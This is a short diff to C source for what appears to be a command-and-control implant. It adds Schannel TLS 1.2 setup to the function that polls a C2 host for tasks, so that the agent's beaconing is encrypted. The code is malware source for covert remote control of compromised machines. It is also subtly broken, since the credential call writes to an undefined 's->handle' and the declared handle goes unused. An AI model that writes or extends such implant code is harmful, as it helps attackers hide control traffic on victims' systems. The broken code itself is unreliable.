@@ -113,11 +113,29 @@ static VOID PollServerOnce(VOID)
 	DWORD commandResultLength = 0;
 	DWORD commandStatus = NO_ERROR;
 
-	if (!NetworkInit(G_C2Host, G_C2Port, &sock))
+	//TLS specific variables 
+	SCHANNEL_CRED cred = {
+			.dwVersion = SCHANNEL_CRED_VERSION,
+			.dwFlags = SCH_USE_STRONG_CRYPTO          // use only strong crypto alogorithms
+					 | SCH_CRED_AUTO_CRED_VALIDATION  // automatically validate server certificate
+					 | SCH_CRED_NO_DEFAULT_CREDS,     // no client certificate authentication
+			.grbitEnabledProtocols = SP_PROT_TLS1_2,  // allow only TLS v1.2
+		};
+	CredHandle credHandle = {0};
+	CtxtHandle contextHandle = {0};
+
+	if (AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL, &cred, NULL, NULL, &s->handle, NULL) != SEC_E_OK)
+	{
+		
+		return;
+	}
+
+	if (!NetworkInit(G_C2Host, G_C2Port, &sock, &cred, &credHandle, &contextHandle))
 	{
 		return;
 	}
 
+	//SendHttpsMessage
 	if (!SendTlvMessage(
 		sock,
 		MSG_AGENT_GET_TASK,
